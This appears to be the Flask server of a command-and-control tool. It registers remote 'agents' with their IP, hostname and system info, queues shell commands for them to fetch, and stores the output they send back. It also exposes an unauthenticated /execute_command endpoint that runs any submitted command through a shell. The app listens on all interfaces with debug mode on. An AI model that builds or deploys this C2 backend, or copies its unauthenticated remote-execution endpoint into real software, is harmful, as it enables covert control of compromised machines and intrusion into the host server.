from flask import Flask, request, render_template, jsonify, session, redirect, url_for
import os
import json
from datetime import datetime, timedelta
from dotenv import load_dotenv
import subprocess

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Set the secret key for session management
app.secret_key = os.getenv("SECRET_KEY")

# Admin credentials
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

# File to store agent information
AGENTS_FILE = "server/agents.json"
COMMANDS_FILE = "server/commands.json"
COMMANDS_OUTPUT_FILE="server/commands_output.json"

# Time threshold in minutes
TIMEOUT_THRESHOLD = timedelta(seconds=40)

# Load agents from file
def load_agents():
    """Load agents from file and remove those that have been inactive for too long."""
    try:
        with open(AGENTS_FILE, "r") as f:
            agents = json.load(f)

        # Remove agents who haven't been seen
        current_time = datetime.utcnow()
        active_agents = {
            agent_id: agent
            for agent_id, agent in agents.items()
            if current_time - datetime.fromisoformat(agent["last_seen"]) < TIMEOUT_THRESHOLD
        }

        return active_agents

    except FileNotFoundError:
        return {}

# Save agents to file
def save_agents(agents):
    with open(AGENTS_FILE, "w") as f:
        json.dump(agents, f, indent=4)

# Login page
@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle login requests."""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            # Set session to logged in
            session['logged_in'] = True
            return redirect(url_for('dashboard'))

        return render_template("login.html", error="Invalid username or password")

    return render_template("login.html")

# Logout
@app.route('/logout')
def logout():
    """Handle logout requests."""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Main page. (Redirects to login if unauthenticated)
@app.route('/')
def dashboard():
    """Render the dashboard to display agent information."""
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    agents = load_agents()
    return render_template("dashboard.html", agents=agents)

# Agent Details Page
@app.route('/agent/<agent_id>')
def agent_details(agent_id):
    """Render the details page for a specific agent."""
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    # Load the agents data
    agents = load_agents()
    agent = agents.get(agent_id)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404

    # Load the command output data for the specific agent
    commands_data = load_command_output()  # Function that loads the command output from JSON
    agent_commands = commands_data.get(agent_id, {})


    return render_template("agent_details.html", agent=agent, agent_commands=agent_commands, agent_id=agent_id)

# Agent Registration
@app.route('/register', methods=['POST'])
def register_agent():
    """Handle agent registration."""
    data = request.json
    if not data or "agent_id" not in data:
        return jsonify({"error": "Invalid data"}), 400

    agents = load_agents()
    agent_id = data["agent_id"]

    # Extract system info from data
    system_info = data.get("system_info", {})
    
    # Beautify the timestamp
    last_seen_utc = datetime.utcnow()
    last_seen_readable = last_seen_utc.strftime("%Y-%m-%d %H:%M:%S")  # Human-readable format

    # Update or add agent
    agents[agent_id] = {
        "ip": data.get("ip", "Unknown"),
        "hostname": data.get("hostname", "Unknown"),
        "last_seen": last_seen_readable,  # Use the beautified format
        "os": data.get("os", "Unknown"),
        "system_info": system_info,  # Add system_info here
    }

    save_agents(agents)
    return jsonify({"status": "registered"})


##
# Load commands from file (Unused?)
def load_commands():
    """Load commands from file."""
    try:
        with open(COMMANDS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

# Save commands to file (Unused?)
def save_commands(commands):
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands, f, indent=4)

def load_command_output():
    try:
        with open(COMMANDS_OUTPUT_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}  # Return an empty dict if the file does not exist

# Send command to agent
@app.route('/send_command', methods=['POST'])
def send_command():
    """Send a command to a specific agent."""
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")

    if not agent_id or not command:
        return jsonify({"error": "Invalid data"}), 400

    # Load existing commands
    commands = load_commands()

    # Add the new command to the list for the agent
    if agent_id not in commands:
        commands[agent_id] = []

    # Append the new command if it's not already in the list
    if command not in commands[agent_id]:
        commands[agent_id].append(command)

    save_commands(commands)

    return jsonify({"status": "command sent"})

# Get pending commands for an agent
@app.route('/get_command/<agent_id>')
def get_command(agent_id):
    """Get pending commands for a specific agent."""
    commands = load_commands()
    agent_commands = commands.get(agent_id, [])
    if not agent_commands:
        return jsonify({"message": "No commands pending"}), 200

    # Return the first command and remove it from the list
    command = agent_commands.pop(0)
    save_commands(commands)
    return jsonify({"command": command})

# Execute command from the agent
@app.route('/execute_command', methods=['POST'])
def execute_command():
    """Execute a command on the server and return the result."""
    data = request.json
    command = data.get("command")
    
    if not command:
        return jsonify({"error": "No command provided"}), 400

    try:
        # Execute the command and capture the output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.returncode == 0 else result.stderr
        return jsonify({"output": output, "status": "success" if result.returncode == 0 else "failed"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    

@app.route('/store_command_output', methods=['POST'])
def store_command_output():
    """Store the command output in a JSON file."""
    try:
        # Get the JSON data from the request
        data = request.get_json()

        # Check if the necessary fields are present in the data
        if not all(key in data for key in ["agent_id", "command", "output"]):
            return jsonify({"error": "Missing data"}), 400

        agent_id = data["agent_id"]
        command = data["command"]
        output = data["output"]

        # Load existing data from the commands_output.json file
        try:
            with open(COMMANDS_OUTPUT_FILE, "r") as f:
                commands_data = json.load(f)
        except FileNotFoundError:
            commands_data = {}

        # Update the data with the new command output
        if agent_id not in commands_data:
            commands_data[agent_id] = {}

        commands_data[agent_id][command] = output

        # Write the updated data back to the file
        with open(COMMANDS_OUTPUT_FILE, "w") as f:
            json.dump(commands_data, f, indent=4)

        print(f"Command output for agent {agent_id} saved to {COMMANDS_OUTPUT_FILE}.")

        return jsonify({"message": "Command output stored successfully."}), 200

    except Exception as e:
        print(f"Error storing command output: {e}")
        return jsonify({"error": "Internal server error"}), 500


##
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
